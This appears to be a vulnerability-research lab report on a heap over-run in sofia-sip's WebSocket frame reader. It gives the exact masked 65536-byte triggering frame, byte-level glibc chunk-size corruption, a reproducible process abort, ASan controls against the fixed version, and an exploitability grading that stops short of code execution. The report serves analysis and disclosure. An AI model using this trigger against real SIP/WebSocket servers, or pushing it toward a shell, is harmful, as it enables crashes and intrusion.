# sofiasip2shell — real 64 KiB allocator layout: chosen XOR delta reaches the next chunk's size field

CVE-2026-116791 / GHSA-whfw-c3jj-99rp, pinned `v1.13.17` (`6198851a`) against
`v1.13.18` (`ad36ac8f`). Wake W1, 2026-11-22. All paths repo-relative.

## Result

Frontier measured the unmask over-run at rung 3/4 in a 64-byte stub arena
(`reports/frontier-sofiasip2shell.md`). This wake moves the same verbatim
function to the **real 64 KiB allocator layout on this host** and a **real
loopback TCP read path**, then repeats the drive against a **full ASan build of
the pinned library**. The charter's deciding question — do the 14 XOR bytes
land on a neighbouring object or allocator metadata, or only in inert
allocator padding? — is answered:

**6 of the 14 bytes reach the low 6 bytes of the next glibc chunk's `size`
field.** The other 8 bytes (including the trailing NUL) land in the next
chunk's `prev_size`, which is inside malloc's guaranteed usable space for a
65536-byte request (65544 usable bytes on this glibc). With the natural
allocation order the next chunk is the **top chunk**; the corrupted size makes
the very next `malloc()` abort with `malloc(): corrupted top size`. When a live
object occupies that neighbouring chunk instead, its **data is untouched** —
the extent stops three bytes short of it — and only its chunk `size` header is
corrupted. This is a deterministic, attacker-influenced heap-metadata
corruption and process abort on a real allocator layout: a stronger rung 4
than frontier's controlled-arena readback, but still **not** pointer control,
marker execution or RCE.

## Method

`lab/sofiasip2shell/layout/real_layout.c` includes frontier's verbatim pinned
`ws_read_frame()` slice (`fns-1.13.17.inc` / `fns-1.13.18.inc`, re-hash-checked
on every run against the frontier-verified SHA-256s). Everything else is the
real host path:

- `wsh->buffer = malloc(65536)` then `wsh->bbuffer = malloc(65536)` — the
  pinned `ws_init` order (vulnerable pin `ws.c:743-744`); the fixed pin uses
  `malloc(bbuflen+1)` as its real `ws_init` does.
- A real `AF_INET` listener on `127.0.0.1:0`, an accepted socket, and a
  connecting client; the frame is written to the wire and read back by
  `read(2)` inside the `ws_raw_read` stub. No scripted in-memory feed.
- A real masked BINARY frame: `0x82 0xff`, 8-byte length = 65536, mask
  `41 5a 42 43`, then 65536 payload bytes.
- `handshake=1`, `payload_size_max = 4 MiB`. The vulnerable path takes the
  no-realloc branch (`need+blen = 65536` is not `> bbuflen = 65536`); the read
  loop leaves `datalen=65550`, `rplen=65536`; the unmask loop indexes
  `body[0..65549]`, i.e. 14 bytes past the 65536 request.

Run with `bash lab/sofiasip2shell/layout/run.sh`; raw per-case stdout, stderr
and rc are in `lab/sofiasip2shell/layout/evidence/`, consolidated output in
`lab/sofiasip2shell/layout/layout-run.txt`.

## Observed bytes (vulnerable pin, plain build)

From `evidence/plain-v17-vuln.err`. Offsets are relative to the requested
`bbuffer` base; `malloc_usable_size(bbuffer)=65544`.

```
PRECALL PIN=v1.13.17 MODE=vuln PAYLOAD=65536 BBUFLEN=65536 USABLE=65544 MASK=415a4243
PIN=v1.13.17 MODE=vuln RV=65536 DATALEN=65550 RPLEN=65536 BBLEN=65536 USABLE=65544 OC=2
BEFORE 00 00 00 00 00 00 00 00 71 0c 02 00 00 00 00 00 00 ...
AFTER  00 5a 42 43 41 5a 42 43 30 56 40 43 41 5a 00 00 00 ...
META_OFF=+8 NEXT_SIZE_BEFORE=710c020000000000 NEXT_SIZE_AFTER=30564043415a0000
XOR_DELTA_BAD=0 NUL=00
```

| Offsets | glibc meaning | Before | After | Source |
|---|---|---|---|---|
| +0 | next chunk `prev_size` (inside usable padding) | `00` | `00` | terminating NUL |
| +1..+7 | next chunk `prev_size` | `00` ×7 | mask bytes `5a 42 43 41 5a 42 43` | XOR of zero padding |
| +8..+13 | **low 6 bytes of next chunk `size`** | `71 0c 02 00 00 00` | `30 56 40 43 41 5a` | XOR with mask `[0..5]%4` |
| +14,+15 | high bytes of next chunk `size` | `00 00` | `00 00` | outside the 14-byte extent |

Each metadata byte equals `before ^ mask[(offset)%4]`:
`71^41=30`, `0c^5a=56`, `02^42=40`, `00^43=43`, `00^41=41`, `00^5a=5a`.
The top-chunk size changes from `0x20c71` to `0x5a41434056403000`.

Deliberately issuing one more `malloc(64)` after the frame makes glibc reject
the corrupted metadata (`evidence/plain-v17-abort.err`, rc 134):

```
malloc(): corrupted top size
```

The same abort is what a first post-frame stdout allocation triggers in the
instrumented variant; the final harness captures the readback into a stack
buffer first so the metadata can be measured before the abort.

## Adjacent live object: data untouched, chunk header corrupted

`plain-v17-victim` allocates a 128-byte object filled with `0xC3`
**after** `bbuffer`, so it is the natural neighbouring chunk
(`evidence/plain-v17-victim.err`):

```
VICTIM_OFF=65552 VICTIM_SIZE_BEFORE=9100000000000000
VICTIM_DATA_BEFORE=c3c3c3c3c3c3c3c3 VICTIM_DATA_AFTER=c3c3c3c3c3c3c3c3
VICTIM_SIZE_AFTER=d05a4243415a0000
...
AFTER  00 5a 42 43 41 5a 42 43 d0 5a 42 43 41 5a 00 00 c3 c3 c3 ...
XOR_DELTA_BAD=0 NUL=00
```

The neighbour's user data starts at `bbuffer+65552`; the 14-byte extent ends
at `bbuffer+65549`, **three bytes short of the object's data**, which is
unchanged. What is corrupted is the neighbour's chunk `size` field at
`bbuffer+65544..+65549` (`0x91` -> low bytes `d0 5a 42 43 41 5a`), with the
same `before ^ mask[i%4]` delta. On this glibc and request size the overrun is
therefore an allocator-metadata write, not an adjacent-object-data write;
converting it into object-data control would need different chunk geometry.

## Controls (layout harness)

| Case | Build | rc | Observation |
|---|---|---|---|
| `asan-v17-vuln` | v1.13.17, ASan, 65536 payload | 1 | `ERROR: AddressSanitizer: heap-buffer-overflow`, `READ of size 1`, `0 bytes after 65536-byte region`, frame `ws_read_frame` at `fns-1.13.17.inc:185` |
| `asan-v17-safe` | v1.13.17, ASan, 65520 payload | 0 | clean, `DATALEN=65534 RPLEN=65520` |
| `asan-f18-vuln` | v1.13.18 (+1 slot), ASan, 65536 payload | 0 | clean, `USABLE=65537`, `DATALEN=65550 RPLEN=65536` |
| `plain-v17-vuln` | v1.13.17, plain, 65536 payload | 0 | chosen delta in next chunk size, as above |
| `plain-v17-safe` | v1.13.17, plain, 65520 payload | 0 | `BEFORE == AFTER`, `CONTROL=SHORT_FRAME_UNTOUCHED` |
| `plain-f18-vuln` | v1.13.18 (+1 slot), plain, 65536 payload | 0 | `BEFORE == AFTER`, `CONTROL=FIXED_PIN_UNTOUCHED` |
| `plain-v17-abort` | v1.13.17, plain, +post-frame malloc | 134 | `malloc(): corrupted top size` |
| `plain-v17-victim` | v1.13.17, plain, adjacent 128-byte object | 0 | neighbour data unchanged (`0xC3`), neighbour chunk `size` low 6 bytes XOR-corrupted |

## Full pinned library build (real API, real HTTP upgrade)

A separate bounded slice built the complete pinned `libsofia-sip-ua` with ASan
from `git archive` exports of both tags (`./autogen.sh`,
`CC=clang CFLAGS='-O0 -g -fno-omit-frame-pointer -fsanitize=address'
LDFLAGS='-fsanitize=address' ./configure --disable-shared --enable-static
--disable-stun`, `make -C libsofia-sip-ua -j4`). Full commands, logs and
per-case `.out/.err/.rc` are in `lab/sofiasip2shell/libbuild/`; summary
`lab/sofiasip2shell/libbuild/RESULT.md`. The driver
(`driver/real_ws_driver.c`) includes the library's own `ws.h`, performs a real
HTTP 101 upgrade on a loopback `127.0.0.1:0` socket inside `ws_init`, sets
`handshake=1`, writes the masked 65536-byte frame, then calls the library's
`ws_read_frame()`. Extracted `ws.c` SHA-256s match the pinned tags
(`90ef747f…` vulnerable, `7c0b8b55…` fixed).

- `v17-full` rc 1: first ASan fault is `WRITE of size 1`, `0 bytes after
  65536-byte region`, top frame `ws_raw_read` at `ws.c:427`, caller
  `ws_read_frame` at `ws.c:1073`, allocation from `ws_init` at `ws.c:744`.
  Line 427 is `*((char *)data + r) = '\0';` — the real `ws_raw_read` writes a
  NUL one byte past a fully filled buffer before the unmask loop runs. The
  layout harness above stubs `ws_raw_read` without that terminator, which is
  why its first report is the XOR-loop read at `fns-1.13.17.inc:185`.
- `v17recover-full` (same pin, `-fsanitize-recover=address`,
  `halt_on_error=0`): three ASan reports, including the direct
  `ws_read_frame` hits `ws.c:1090` (unmask XOR) and `ws.c:1100` (trailing
  NUL), plus `ws.c:427`. Its rc 0 is an artifact of recover mode, not a clean
  run. `POSTCALL ... RV=65536 DATALEN=65550 RPLEN=65536`.
- Controls clean (no ASan reports): `v17-short`, `v18-full`, `v18-short`,
  `v17recover-short`. The fixed pin has the `+1` slot and rplen-bounded loop.

Net effect on the 14-byte extent is unchanged by the `ws_raw_read` NUL: it
writes offset +0 (padding) first, the XOR loop then sets +0..+13, and the
trailing NUL rewrites +0 to zero. The byte-level metadata conclusion above
therefore describes the real library's final heap state too.

## Honest grade

- **Rung 1/2**: deterministic real-frame trigger; `datalen=65550` vs
  `rplen=65536` state mismatch observed.
- **Rung 3**: ASan-confirmed out-of-bounds read/write at the real 64 KiB
  region in a full pinned-library build, plus a byte-level readback of changed
  allocator metadata.
- **Rung 4 (upgraded)**: an attacker-chosen repeating-XOR delta is written to
  6 bytes of the next chunk's size field on a natural allocator layout, and
  the next allocation aborts. The chosen *delta* depends on the bytes already
  present (top-chunk size `0x20c71` here); the attacker controls the 4-byte
  mask, not arbitrary bytes. With a live neighbour, its data stays intact and
  only its chunk header changes. Consequence demonstrated: heap corruption and
  a deterministic process abort (the advisory's "crash takes down the
  process" claim), not a controlled pointer or executed marker.
- **Rung 5**: not attempted, not implied. No FreeSWITCH SIP `ws-binding` call
  path, no command, no side effect beyond a local abort. The advisory's RCE
  sentence remains a claim.

## Limits and what would change the grade

- The layout harness calls `ws_init`/`ws_read_frame` directly over a real
  loopback socket; the library-build driver performs a real HTTP 101 upgrade
  inside `ws_init` but sets `handshake=1` explicitly. Neither exercises a live
  FreeSWITCH `ws-binding`/SIP call path; the rest of the SIP stack is absent.
- ASan's allocator gives no usable-size padding (redzone at exactly 65536), so
  the metadata reach is measured only in the plain build.
- The natural next chunk is the top chunk; `plain-v17-victim` puts a live
  128-byte object there and confirms the extent stops three bytes before its
  data. Reaching object data, not just its chunk header, would need different
  chunk geometry.
- Only one mask (`415a4243`) and one length value (65536) were tested.
  Converting the delta into a *useful* heap state (overlapping chunks, pointer
  control) needs more mask/layout freedom and was not attempted.
- Evidence that the fixed pin also faults under this layout, that the bytes
  land only in padding on a different glibc/allocator, or that the `+1` slot
  absorbs the terminator in every natural configuration would change the
  conclusion.

## Reproduction

```
bash lab/frontier/sofiasip2shell/harness/run.sh          # frontier baseline: PASS=128 FAIL=0
bash lab/sofiasip2shell/layout/run.sh                     # layout harness, eight cases
bash lab/sofiasip2shell/libbuild/driver/build_and_run.sh v17 v1.13.17 full short
bash lab/sofiasip2shell/libbuild/driver/build_and_run.sh v18 v1.13.18 full short
ASAN_OPTIONS_OVERRIDE='detect_leaks=0:abort_on_error=0:halt_on_error=0' \
  bash lab/sofiasip2shell/libbuild/driver/build_and_run.sh v17recover v1.13.17-recover full short
```
